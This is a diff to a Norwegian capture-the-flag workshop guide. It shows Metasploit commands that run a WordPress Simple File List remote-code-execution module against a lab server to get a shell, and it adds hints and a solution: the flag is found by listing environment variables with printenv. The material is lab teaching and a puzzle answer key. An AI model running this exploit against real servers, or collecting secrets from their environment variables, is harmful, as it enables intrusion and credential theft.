@@ -161,7 +161,7 @@ Kjør kommandoene under, så vil du forhåpentligvis få et shell på serveren!
 > use exploit/multi/http/wp_simple_file_list_rce
 > set RHOST 192.168.38.72
 > set RPORT 1337
-> set LHOST <deres ip>
+> set LHOST <deres egen ip>
 > exploit
 ```  
 </details>
@@ -174,17 +174,21 @@ Nå som vi har et shell på serveren, kan vi begynne å snoke rundt etter noe in
 **Ta en runde på serveren, og se om dere finner noe som ligner et flagg.**
 
 <details><summary>Hint 1</summary>
-  TODO
+Det kan være fristende å navigere rundt i filsystemet, men det vil være en blindvei i dette tilfellet. 
 </details>
 
 
 <details><summary>Hint 2</summary>
-  TODO
+Hvor pleier man å gjemme hemmeligheter?
 </details>
 
+<details><summary>Hint 3</summary>
+Det kan være lurt å ta en titt på miljøvariabler.
+</details>
 
 <details><summary>Løsningsforslag</summary>
-  TODO
+
+Flagget ligger i en miljøvariabel på serveren. Kjør følgende kommando: `printenv`
 </details>
 
 </br>
